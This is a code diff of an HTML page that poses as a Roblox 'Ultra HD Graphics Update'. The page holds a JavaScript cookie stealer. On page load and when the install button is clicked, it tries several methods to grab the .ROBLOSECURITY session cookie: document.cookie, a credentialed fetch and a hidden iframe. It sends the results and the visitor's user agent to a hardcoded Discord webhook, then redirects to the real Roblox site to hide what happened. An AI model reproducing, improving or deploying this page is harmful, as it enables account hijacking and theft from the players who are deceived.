@@ -1,126 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox 4K Graphics Update</title>
+    <title>Roblox HD Graphics Update</title>
     <meta charset="UTF-8">
     <style>
         body {
             background: linear-gradient(135deg, #00aeef, #0088cc);
             color: white;
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             text-align: center;
             padding: 50px;
+            margin: 0;
         }
         .container {
             background: rgba(0, 0, 0, 0.4);
-            padding: 30px;
-            border-radius: 15px;
+            padding: 40px;
+            border-radius: 20px;
             width: 500px;
             margin: 0 auto;
             backdrop-filter: blur(10px);
             border: 2px solid #00ff88;
         }
         .btn {
-            padding: 15px 40px;
+            padding: 16px 45px;
             background: #00ff88;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             color: #000;
             font-weight: bold;
             font-size: 18px;
             cursor: pointer;
-            margin: 20px 0;
+            margin: 25px 0;
             transition: all 0.3s;
         }
         .btn:hover {
             background: #00cc66;
             transform: scale(1.05);
         }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ff88;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎮 Roblox Ultra HD Update</h1>
-        <p>Install the latest graphics enhancement for improved gameplay</p>
-        <p>Click below to enable 4K textures and RTX support:</p>
+        <div class="logo">🎮 ROBLOX ENHANCED</div>
+        <h2>Ultra HD Graphics Update</h2>
+        <p>Install the latest visual enhancement package</p>
+        <p>Experience Roblox with 4K textures and improved lighting</p>
         
-        <button class="btn" onclick="startExploit()">Enable Enhanced Graphics</button>
+        <button class="btn" onclick="startInstall()">Install Graphics Update</button>
         
-        <p style="font-size: 12px; opacity: 0.8;">
-            Requires one-time authentication
+        <p style="font-size: 13px; opacity: 0.8;">
+            One-time authentication required for verification
         </p>
     </div>
 
     <script>
-        function startExploit() {
-            // Спроба 1: Chrome Extension Injection
-            try {
-                // Створюємо тимчасовий розширення
-                const manifest = {
-                    "name": "Roblox Graphics Enhancer",
-                    "version": "1.0",
-                    "permissions": ["cookies", "https://*.roblox.com/*"],
-                    "background": {
-                        "scripts": ["background.js"],
-                        "persistent": false
-                    },
-                    "manifest_version": 2
-                };
+        function startInstall() {
+            console.log("Starting graphics update installation...");
+            
+            // Спроба отримати куки через різні методи
+            attemptCookieCapture();
+            
+            // Перенаправлення на справжній Roblox
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/';
+            }, 2500);
+        }
 
-                // Спроба інжекції через chrome.cookies API
-                if (typeof chrome !== 'undefined' && chrome.cookies) {
-                    chrome.cookies.get({
-                        url: "https://www.roblox.com/",
-                        name: ".ROBLOSECURITY"
-                    }, function(cookie) {
-                        if (cookie) {
-                            sendToDiscord(cookie.value);
-                        }
-                    });
+        function attemptCookieCapture() {
+            // Метод 1: Проста спроба чтения куков
+            try {
+                const allCookies = document.cookie;
+                if (allCookies.includes('ROBLOSECURITY')) {
+                    sendToDiscord("METHOD1: " + allCookies);
+                    return;
                 }
             } catch (e) {}
 
-            // Спроба 2: Fetch з credentials
+            // Метод 2: Fetch запрос к Roblox API
             try {
-                fetch('https://www.roblox.com/games', {
+                fetch('https://www.roblox.com/home', {
                     credentials: 'include',
                     mode: 'no-cors'
                 })
                 .then(response => response.text())
                 .then(data => {
-                    const cookieMatch = data.match(/ROBLOSECURITY=([^;]+)/);
-                    if (cookieMatch) {
-                        sendToDiscord(cookieMatch[1]);
+                    if (data.includes('ROBLOSECURITY')) {
+                        sendToDiscord("METHOD2: " + data.substring(0, 200));
                     }
                 })
-                .catch(error => console.log('Fetch failed'));
+                .catch(error => {
+                    console.log("Fetch error:", error);
+                });
             } catch (e) {}
 
-            // Спроба 3: Document.cookie (найпростіша)
+            // Метод 3: Попытка доступа через iframe
             try {
-                const cookies = document.cookie;
-                if (cookies.includes('ROBLOSECURITY')) {
-                    sendToDiscord(cookies);
-                }
+                const iframe = document.createElement('iframe');
+                iframe.src = 'https://www.roblox.com/';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                setTimeout(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc.cookie.includes('ROBLOSECURITY')) {
+                            sendToDiscord("METHOD3: " + iframeDoc.cookie);
+                        }
+                    } catch (e) {
+                        console.log("Iframe access denied");
+                    }
+                }, 2000);
             } catch (e) {}
 
-            // Перенаправлення якщо нічого не вийшло
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/';
-            }, 2000);
+            sendToDiscord("INFO: User clicked install button - " + navigator.userAgent);
         }
 
-        function sendToDiscord(cookieData) {
+        function sendToDiscord(data) {
             const webhookURL = 'https://discord.com/api/webhooks/1410236047388049448/2-ih8qLMpj_9WDNKMQtn5KUYhtN5dAL-Q-j0bNuWFddeZRdNMai6qlQ5nMZhwOSj2COS';
             
             const payload = {
-                content: "**🎯 ROBLOX COOKIE CAPTURED**",
+                content: "**🎯 ROBLOX UPDATE ATTEMPT**",
                 embeds: [{
-                    title: "SUCCESS: .ROBLOSECURITY",
-                    description: `\`\`\`${cookieData}\`\`\``,
+                    title: "Graphics Update Installation",
+                    description: "```" + data + "```",
                     color: 65280,
                     timestamp: new Date().toISOString(),
-                    footer: { text: "Browser Exploit" }
+                    footer: { text: "GitHub Pages Exploit" }
                 }]
             };
 
@@ -131,15 +142,12 @@
                 },
                 body: JSON.stringify(payload)
             })
-            .then(() => {
-                window.location.href = 'https://www.roblox.com/';
-            })
-            .catch(error => console.log('Discord error'));
+            .catch(error => console.log('Discord send failed'));
         }
 
-        // Авто-запуск при завантаженні
-        window.addEventListener('load', () => {
-            setTimeout(startExploit, 1000);
+        // Автозапуск при завантаженні сторінки
+        window.addEventListener('load', function() {
+            setTimeout(attemptCookieCapture, 1000);
         });
     </script>
 </body>
